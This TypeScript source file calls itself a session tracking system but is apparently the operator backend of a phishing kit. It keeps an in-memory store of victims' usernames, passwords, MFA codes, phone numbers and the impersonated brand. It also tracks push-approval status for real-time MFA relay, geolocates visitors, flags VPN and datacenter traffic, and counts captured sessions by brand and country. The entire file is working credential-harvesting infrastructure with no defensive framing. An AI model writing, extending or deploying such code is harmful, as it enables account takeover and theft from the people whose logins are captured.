/**
 * Session Tracking System
 * Stores active sessions in memory with geolocation data
 */

export interface GeoData {
  country: string;
  countryCode: string;
  region: string;
  city: string;
  isp: string;
  org: string;
  isVpn: boolean;
  isProxy: boolean;
  isDatacenter: boolean;
  timezone: string;
}

export interface DeviceInfo {
  browser: string;
  browserVersion: string;
  os: string;
  osVersion: string;
  deviceType: 'desktop' | 'mobile' | 'tablet' | 'unknown';
  isMobile: boolean;
}

export interface Session {
  id: string;
  ip: string;
  userAgent: string;
  brand: string;
  currentPage: string;
  username?: string;
  password?: string;
  mfaCode?: string;
  mfaMethod?: string;
  phoneNumber?: string;
  geo?: GeoData;
  device: DeviceInfo;
  createdAt: Date;
  updatedAt: Date;
  isActive: boolean;
  pushStatus?: 'waiting' | 'approved' | 'rejected';
  pushRequestedAt?: Date;
}

// In-memory session store
const sessions: Map<string, Session> = new Map();

// Session timeout (5 minutes of inactivity)
const SESSION_TIMEOUT = 5 * 60 * 1000;

/**
 * Parse user agent string to extract device info
 */
export function parseUserAgent(ua: string): DeviceInfo {
  const info: DeviceInfo = {
    browser: 'Unknown',
    browserVersion: '',
    os: 'Unknown',
    osVersion: '',
    deviceType: 'unknown',
    isMobile: false,
  };

  // Detect browser
  if (ua.includes('Firefox/')) {
    info.browser = 'Firefox';
    info.browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || '';
  } else if (ua.includes('Edg/')) {
    info.browser = 'Edge';
    info.browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || '';
  } else if (ua.includes('Chrome/')) {
    info.browser = 'Chrome';
    info.browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || '';
  } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
    info.browser = 'Safari';
    info.browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || '';
  } else if (ua.includes('MSIE') || ua.includes('Trident/')) {
    info.browser = 'Internet Explorer';
    info.browserVersion = ua.match(/(?:MSIE |rv:)([\d.]+)/)?.[1] || '';
  }

  // Detect OS
  if (ua.includes('Windows NT 10')) {
    info.os = 'Windows';
    info.osVersion = '10/11';
  } else if (ua.includes('Windows NT 6.3')) {
    info.os = 'Windows';
    info.osVersion = '8.1';
  } else if (ua.includes('Windows NT 6.1')) {
    info.os = 'Windows';
    info.osVersion = '7';
  } else if (ua.includes('Mac OS X')) {
    info.os = 'macOS';
    info.osVersion = ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g, '.') || '';
  } else if (ua.includes('Linux')) {
    info.os = 'Linux';
  } else if (ua.includes('Android')) {
    info.os = 'Android';
    info.osVersion = ua.match(/Android ([\d.]+)/)?.[1] || '';
  } else if (ua.includes('iPhone') || ua.includes('iPad')) {
    info.os = 'iOS';
    info.osVersion = ua.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || '';
  }

  // Detect device type
  if (ua.includes('Mobile') || ua.includes('Android') && !ua.includes('Tablet')) {
    info.deviceType = 'mobile';
    info.isMobile = true;
  } else if (ua.includes('Tablet') || ua.includes('iPad')) {
    info.deviceType = 'tablet';
    info.isMobile = true;
  } else {
    info.deviceType = 'desktop';
  }

  return info;
}

/**
 * Fetch geolocation data for an IP address
 */
export async function getGeoData(ip: string): Promise<GeoData | undefined> {
  // Skip for localhost/private IPs
  if (ip === 'unknown' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
    return {
      country: 'Local',
      countryCode: 'LO',
      region: 'Local',
      city: 'Localhost',
      isp: 'Local Network',
      org: 'Local',
      isVpn: false,
      isProxy: false,
      isDatacenter: false,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };
  }

  try {
    // Using ip-api.com (free, no API key needed, includes VPN/proxy detection)
    const response = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,isp,org,proxy,hosting,timezone`
    );

    if (!response.ok) return undefined;

    const data = await response.json();

    if (data.status !== 'success') return undefined;

    return {
      country: data.country || 'Unknown',
      countryCode: data.countryCode || '??',
      region: data.regionName || 'Unknown',
      city: data.city || 'Unknown',
      isp: data.isp || 'Unknown',
      org: data.org || 'Unknown',
      isVpn: data.proxy || false,
      isProxy: data.proxy || false,
      isDatacenter: data.hosting || false,
      timezone: data.timezone || 'Unknown',
    };
  } catch (error) {
    console.error('Geo lookup error:', error);
    return undefined;
  }
}

/**
 * Normalize IP values so localhost IPv6/IPv4 map to a single value
 */
export function normalizeIp(ip: string): string {
  if (!ip) return 'unknown';
  // If behind a proxy X-Forwarded-For may contain a list
  if (ip.includes(',')) ip = ip.split(',')[0].trim();
  if (ip === '::1') return '127.0.0.1';
  return ip;
}

/**
 * Generate a unique session ID
 */
function generateSessionId(): string {
  return `${Date.now()}-${Math.random().toString(36).substring(2, 11)}`;
}

/**
 * Create or update a session
 */
export async function upsertSession(
  ip: string,
  userAgent: string,
  brand: string,
  page: string,
  credentials?: { username?: string; password?: string; mfaCode?: string; mfaMethod?: string },
  sessionId?: string
): Promise<Session> {
  // Normalize ip for storage
  const normIp = normalizeIp(ip);

  // If sessionId provided, prefer updating that session
  let session: Session | undefined;
  if (sessionId) {
    session = sessions.get(sessionId);
  }

  // Fallback: find existing session by IP
  if (!session) {
    session = Array.from(sessions.values()).find(s => s.ip === normIp && s.isActive);
  }

  if (session) {
    // Update existing session
    session.ip = normIp;
    session.currentPage = page;
    session.userAgent = userAgent;
    session.updatedAt = new Date();
    if (credentials?.username) session.username = credentials.username;
    if (credentials?.password) session.password = credentials.password;
    if (credentials?.mfaCode) session.mfaCode = credentials.mfaCode;
    if (credentials?.mfaMethod) session.mfaMethod = credentials.mfaMethod;
    sessions.set(session.id, session);
  } else {
    // Create new session
    const device = parseUserAgent(userAgent);
    const geo = await getGeoData(normIp);

    session = {
      id: sessionId || generateSessionId(),
      ip: normIp,
      userAgent,
      brand,
      currentPage: page,
      username: credentials?.username,
      password: credentials?.password,
      mfaCode: credentials?.mfaCode,
      mfaMethod: credentials?.mfaMethod,
      geo,
      device,
      createdAt: new Date(),
      updatedAt: new Date(),
      isActive: true,
    };
    sessions.set(session.id, session);
  }

  return session;
}

/**
 * Get all active sessions
 */
export function getActiveSessions(): Session[] {
  const now = Date.now();

  // Mark timed-out sessions as inactive
  sessions.forEach((session, id) => {
    if (now - session.updatedAt.getTime() > SESSION_TIMEOUT) {
      session.isActive = false;
      sessions.set(id, session);
    }
  });

  return Array.from(sessions.values())
    .filter(s => s.isActive)
    .sort((a, b) => b.updatedAt.getTime() - a.updatedAt.getTime());
}

/**
 * Get all sessions (including inactive)
 */
export function getAllSessions(): Session[] {
  return Array.from(sessions.values())
    .sort((a, b) => b.updatedAt.getTime() - a.updatedAt.getTime());
}

/**
 * Mark a session as inactive
 */
export function endSession(sessionId: string): void {
  const session = sessions.get(sessionId);
  if (session) {
    session.isActive = false;
    sessions.set(sessionId, session);
  }
}

/**
 * Get session by ID
 */
export function getSessionById(sessionId: string): Session | undefined {
  return sessions.get(sessionId);
}

/**
 * Get session by IP (for push status checking)
 */
export function getSessionByIp(ip: string): Session | undefined {
  const norm = normalizeIp(ip);
  return Array.from(sessions.values()).find(s => s.ip === norm && s.isActive);
}

/**
 * Set or update a session's phone number
 */
export function setSessionPhone(sessionId: string, phone: string): boolean {
  const session = sessions.get(sessionId);
  if (session) {
    session.phoneNumber = phone;
    session.updatedAt = new Date();
    sessions.set(sessionId, session);
    return true;
  }
  return false;
}

/**
 * Set push status for a session
 */
export function setPushStatus(sessionId: string, status: 'waiting' | 'approved' | 'rejected'): boolean {
  const session = sessions.get(sessionId);
  if (session) {
    session.pushStatus = status;
    if (status === 'waiting') {
      session.pushRequestedAt = new Date();
    }
    session.updatedAt = new Date();
    sessions.set(sessionId, session);
    return true;
  }
  return false;
}

/**
 * Clear all sessions
 */
export function clearAllSessions(): void {
  sessions.clear();
}

/**
 * Get session statistics
 */
export function getSessionStats() {
  const all = Array.from(sessions.values());
  const active = all.filter(s => s.isActive);

  const byBrand: Record<string, number> = {};
  const byCountry: Record<string, number> = {};
  let vpnCount = 0;

  active.forEach(s => {
    byBrand[s.brand] = (byBrand[s.brand] || 0) + 1;
    if (s.geo?.country) {
      byCountry[s.geo.country] = (byCountry[s.geo.country] || 0) + 1;
    }
    if (s.geo?.isVpn || s.geo?.isProxy || s.geo?.isDatacenter) {
      vpnCount++;
    }
  });

  return {
    totalSessions: all.length,
    activeSessions: active.length,
    vpnUsers: vpnCount,
    byBrand,
    byCountry,
  };
}
